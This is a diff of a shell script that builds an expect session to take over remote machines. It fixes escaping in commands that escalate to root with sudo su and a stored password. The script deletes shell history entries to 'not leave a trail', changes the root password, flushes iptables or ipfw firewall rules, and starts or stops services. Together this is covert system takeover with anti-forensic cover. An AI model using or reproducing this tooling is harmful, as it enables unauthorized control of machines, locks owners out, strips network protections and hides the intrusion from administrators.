@@ -53,14 +53,14 @@ HEAD
 
 if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send \"history -d `history | wc -l`; sudo su\" #make sure we don't leave a trail" >> $expectFile
+	echo "send \"history -d \`history | wc -l\`; sudo su\" #make sure we don't leave a trail" >> $expectFile
 	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
 	echo "send \"$pass\r\"" >> $expectFile
 fi
 
 /bin/cat<<MORE >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "history -d `history | wc -l`; sh" #make sure we don't leave a trail
+send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
 interact -o -nobuffer -re \$prompt return
 send "echo -e \"\" | passwd\r" #change root password
 interact -o -nobuffer -re \$prompt return
@@ -70,20 +70,20 @@ send "/usr/bin/env iptables -F || ipfw flush \r"
 MORE
 
 #start certain services
-for service in serviceStart; do
+for service in $serviceStart; do
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
 	echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
 done
 
 #stop certain services
-for service in serviceStop; do
+for service in $serviceStop; do
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
 	echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
 done
 
 /bin/cat <<BOTTOM >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "history -d `history | wc -l`; exit\r"
+send "history -d \`history | wc -l\`; exit\r"
 interact
 BOTTOM
 
